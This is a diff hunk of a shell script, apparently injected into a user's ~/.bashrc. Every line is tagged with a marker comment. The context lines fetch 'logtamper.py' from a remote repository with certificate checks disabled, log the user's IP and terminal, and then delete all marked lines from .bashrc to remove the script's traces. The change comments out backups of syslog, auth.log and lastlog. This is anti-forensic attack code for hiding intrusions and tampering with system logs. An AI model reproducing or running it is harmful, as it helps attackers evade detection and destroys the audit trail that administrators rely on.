@@ -86,12 +86,12 @@ if [ !  -f $clear_shell ];then #_fdsagadsfasdgadsgsss
     wget --no-check-certificate  -q -c -t 3  'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell; #_fdsagadsfasdgadsgsss
     gglog "Download logtamper ok" #_fdsagadsfasdgadsgsss
 fi #_fdsagadsfasdgadsgsss
-if [ ! -f  $index_f ];then #_fdsagadsfasdgadsgsss
-  gglog "bak /var/log/" #_fdsagadsfasdgadsgsss
-  _bak /var/log/syslog; #_fdsagadsfasdgadsgsss
-  _bak /var/log/auth.log; #_fdsagadsfasdgadsgsss
-  _bak /var/log/lastlog; #_fdsagadsfasdgadsgsss
-fi #_fdsagadsfasdgadsgsss
+#if [ ! -f  $index_f ];then #_fdsagadsfasdgadsgsss
+#  gglog "bak /var/log/" #_fdsagadsfasdgadsgsss
+#  _bak /var/log/syslog; #_fdsagadsfasdgadsgsss
+#  _bak /var/log/auth.log; #_fdsagadsfasdgadsgsss
+#  _bak /var/log/lastlog; #_fdsagadsfasdgadsgsss
+#fi #_fdsagadsfasdgadsgsss
 gglog "${UNDERLINE}ip:$my_ip pts:${my_pts}  ${REST}" #_fdsagadsfasdgadsgsss
 CL #_fdsagadsfasdgadsgsss
 sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc #_fdsagadsfasdgadsgsss
